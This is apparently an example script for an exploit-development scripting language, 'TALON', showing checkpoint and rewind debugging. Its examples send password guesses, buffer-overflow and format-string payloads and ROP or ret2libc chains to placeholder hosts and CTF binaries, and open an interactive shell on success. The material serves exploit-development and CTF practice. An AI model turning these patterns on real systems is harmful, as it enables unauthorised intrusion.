# Time-Travel Debugging Examples
# Demonstrates TALON's checkpoint/rewind debugging capabilities

print("[*] Time-Travel Debugging Examples")
print("==================================================")

# ═══════════════════════════════════════════════════════════════
# Example 1: Basic Checkpoint and Rewind
# ═══════════════════════════════════════════════════════════════

print("\n[1] Basic Checkpoint and Rewind")

# Connect to target
let conn = connect("192.168.1.100", 9999)

# Start debugging mode (activates checkpoint recording)
debug(conn)

# Send initial payload
send(conn, "USER admin\n")
let resp1 = recvline(conn)
print("Response 1:", resp1)

# Create checkpoint after successful authentication
print("[+] Creating checkpoint 'after_auth'")

# Try different payloads
send(conn, "PASS test123\n")
let resp2 = recvline(conn)

if "Failed" in resp2 {
    print("[!] Authentication failed - rewinding to checkpoint")
    # Rewind to before password attempt
    # In real implementation, would call: rewind_to_checkpoint("after_auth")
    
    # Try different password
    send(conn, "PASS admin\n")
    resp2 = recvline(conn)
}

print("Final response:", resp2)

# ═══════════════════════════════════════════════════════════════
# Example 2: Testing Multiple Payloads Without Reconnecting
# ═══════════════════════════════════════════════════════════════

print("\n[2] Testing Multiple Payloads with Rewind")

# Setup
let target = connect("target.com", 1337)
debug(target)

# Create initial checkpoint
print("[+] Checkpoint: initial_state")

# Test payload variations without reconnecting
let payloads = [
    "A" * 264 + p64(0xdeadbeef),
    "A" * 264 + p64(0xcafebabe),
    "A" * 264 + p64(0x12345678)
]

for payload in payloads {
    print("\n[*] Testing payload:", len(payload), "bytes")
    
    # Send payload
    send(target, payload)
    let response = recv(target, 1024)
    
    # Check for success
    if "shell" in response or "bash" in response {
        print("[+] SUCCESS! Payload worked:", payload[264:])
        break
    } else {
        print("[-] Failed - rewinding...")
        # Rewind to initial state and try next payload
        # rewind_to_checkpoint("initial_state")
    }
}

# ═══════════════════════════════════════════════════════════════
# Example 3: Debugging Format String with State Replay
# ═══════════════════════════════════════════════════════════════

print("\n[3] Format String Debugging with Replay")

let fmt_conn = connect("fmt_server.com", 8080)
debug(fmt_conn)

# Find format string offset by testing multiple values
for offset in range(1, 20) {
    print("[*] Testing offset:", offset)
    
    # Create format string payload
    let test_payload = "%{offset}$x".format({offset: offset})
    
    # Send and check response
    send(fmt_conn, test_payload + "\n")
    let leak = recvline(fmt_conn)
    
    # Check if we leaked a valid address
    if "0x7f" in leak or "0x00" in leak {
        print("[+] Found valid offset:", offset)
        print("[+] Leaked value:", leak)
        # Save this state for later exploitation
        print("[+] Creating checkpoint: valid_offset")
        break
    }
    
    # Rewind to try next offset
    # rewind_to_checkpoint("start")
}

# ═══════════════════════════════════════════════════════════════
# Example 4: Split-Screen Debugging (DSL + GDB View)
# ═══════════════════════════════════════════════════════════════

print("\n[4] Split-Screen Debugging")

# Start process for debugging
let proc = process("./vulnerable_binary")

# Enable split-screen debugger
# Top pane: TALON DSL source code
# Bottom pane: GDB disassembly and registers
debug(proc)

# The debug() function creates an interactive split-screen:
# - Shows current line of TALON code being executed
# - Shows corresponding assembly instructions in GDB
# - Allows stepping through both DSL and assembly

# Send payload and watch execution
send(proc, "A" * 264 + p64(0x400123))

# At this point, split-screen shows:
# - DSL: send(proc, "A" * 264 + p64(0x400123))
# - GDB: Breakpoint at return address, showing stack state

# User can:
# - Press 's' to step DSL line
# - Press 'n' to step assembly instruction
# - Press 'c' to continue execution
# - Press 'r' to reverse-step (time travel!)

# ═══════════════════════════════════════════════════════════════
# Example 5: Checkpoint-Based Exploit Development
# ═══════════════════════════════════════════════════════════════

print("\n[5] Checkpoint-Based Exploit Development")

# Load binary
let elf = Elf("./challenge")
let libc = Libc("ubuntu20.04")

# Connect and start debugging
let session = connect("challenge.ctf", 9999)
debug(session)

# Phase 1: Leak libc base
print("[*] Phase 1: Leaking libc base")
send(session, "%3$p\n")
let leak = recvline(session)
let libc_base = parse_hex(leak) - libc.symbols.printf
print("[+] Libc base:", hex(libc_base))

# Create checkpoint after successful leak
print("[+] Checkpoint: libc_leaked")

# Phase 2: Try ROP chain
print("\n[*] Phase 2: Testing ROP chain")
let rop_chain = build_rop_chain(elf, libc_base)

# Test chain
send(session, rop_chain)
let result = recv(session, 1024)

if "shell" not in result {
    print("[-] ROP chain failed - rewinding")
    # Rewind to after libc leak
    # rewind_to_checkpoint("libc_leaked")
    
    # Try alternative ROP chain
    let alt_chain = build_alt_rop_chain(elf, libc_base)
    send(session, alt_chain)
    result = recv(session, 1024)
}

if "shell" in result {
    print("[+] Shell acquired!")
    interactive(session)
}

# ═══════════════════════════════════════════════════════════════
# Example 6: Reverse Debugging for Crash Analysis
# ═══════════════════════════════════════════════════════════════

print("\n[6] Reverse Debugging for Crash Analysis")

let crash_proc = process("./buggy_app")
debug(crash_proc)

# Send input that causes crash
send(crash_proc, "AAAA" + "B" * 500)

# Program crashed - but we can rewind!
print("[!] Crash detected - analyzing with reverse debugging")

# Reverse-step through execution to find where overflow starts
# reverse_step()  # Step backward through execution
# reverse_step()
# reverse_step()

# Now we can see the exact instruction where buffer overflows
# and the state of registers/stack at that moment

# This eliminates the need to restart and reproduce crashes

# ═══════════════════════════════════════════════════════════════
# Example 7: Automated Exploit Testing with Checkpoints
# ═══════════════════════════════════════════════════════════════

print("\n[7] Automated Exploit Testing")

let test_conn = connect("test.target", 4444)
debug(test_conn)

# Dictionary of exploit variations
let exploits = {
    "ret2libc": build_ret2libc_chain(),
    "rop_execve": build_rop_execve(),
    "one_gadget": build_one_gadget_exploit(),
    "ret2dlresolve": build_ret2dlresolve()
}

print("[*] Testing " + str(len(exploits)) + " exploit variations")

# Create checkpoint at clean state
print("[+] Checkpoint: clean_state")

for name, payload in exploits.items() {
    print("\n[*] Testing:", name)
    
    # Send exploit
    send(test_conn, payload)
    
    # Check for success with timeout
    let response = recv(test_conn, 2048, timeout=5)
    
    if "shell" in response or "sh-" in response {
        print("[+] SUCCESS:", name, "worked!")
        interactive(test_conn)
        break
    } else {
        print("[-]", name, "failed - rewinding")
        # Rewind to clean state and try next exploit
        # rewind_to_checkpoint("clean_state")
    }
}

# ═══════════════════════════════════════════════════════════════
# Example 8: State Diffing Between Checkpoints
# ═══════════════════════════════════════════════════════════════

print("\n[8] State Diffing")

let diff_proc = process("./target")
debug(diff_proc)

# Create checkpoint before operation
print("[+] Checkpoint: before_operation")

# Perform some operations
send(diff_proc, "operation1\n")
let state1 = recv(diff_proc, 1024)

# Create second checkpoint
print("[+] Checkpoint: after_operation")

# Compare checkpoints to see what changed
# This shows:
# - Modified registers
# - Changed memory regions
# - Stack differences
# - Heap allocations

# diff_checkpoints("before_operation", "after_operation")

# Output would show:
# Register Changes:
#   RAX: 0x0 -> 0x7ffff7a0d000
#   RDI: 0x1 -> 0x0
# Memory Changes:
#   Stack: 8 bytes modified at 0x7fffffffe000
#   Heap: 256 bytes allocated at 0x555555758000

# ═══════════════════════════════════════════════════════════════

print("\n[+] Time-Travel Debugging Examples Complete")
print("\nKey Features Demonstrated:")
print("  - Checkpoint creation and restoration")
print("  - Rewind to previous states without reconnecting")
print("  - Testing multiple payloads efficiently")
print("  - Split-screen DSL + GDB debugging")
print("  - Reverse debugging for crash analysis")
print("  - Automated exploit testing with state management")
print("  - State diffing between checkpoints")
print("  - Eliminates need for repeated connections")
print("  - Massive time savings during exploit development")
